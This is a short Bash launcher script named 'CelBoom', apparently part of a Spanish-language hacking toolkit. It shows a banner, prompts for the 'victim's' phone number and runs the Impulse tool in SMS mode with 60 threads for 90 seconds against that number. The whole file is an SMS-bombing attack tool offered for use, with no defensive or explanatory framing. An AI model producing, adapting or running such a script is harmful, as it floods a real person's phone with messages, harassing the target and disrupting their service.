#!/bin/bash
#
# Created by: Monkey-hk4
#
# VARIABLES
#
PWD=$(pwd)
source ${PWD}/Colors.sh
#
# FUNCIONES
#
function CelBoom {
	sleep 0.5
	clear
echo -e "${rojo}



 ██████ ███████ ██      ██████   ██████   ██████  ███    ███
██      ██      ██      ██   ██ ██    ██ ██    ██ ████  ████
██      █████   ██      ██████  ██    ██ ██    ██ ██ ████ ██
██      ██      ██      ██   ██ ██    ██ ██    ██ ██  ██  ██
 ██████ ███████ ███████ ██████   ██████   ██████  ██      ██
 
                        by: Monkey-hk4                      
"
}
function PHONE {
echo -e -n "${cyan}
>> Ejemplo: +51222888555
>>>>>>>>   >>>>>  >>>>
Introduce el número de la víctima >> "${blanco}
read -r phone
}
#
# CÓDIGO
#
CelBoom
PHONE
cd
cd Impulse
python impulse.py --method SMS --time 90 --threads 60 --target ${phone}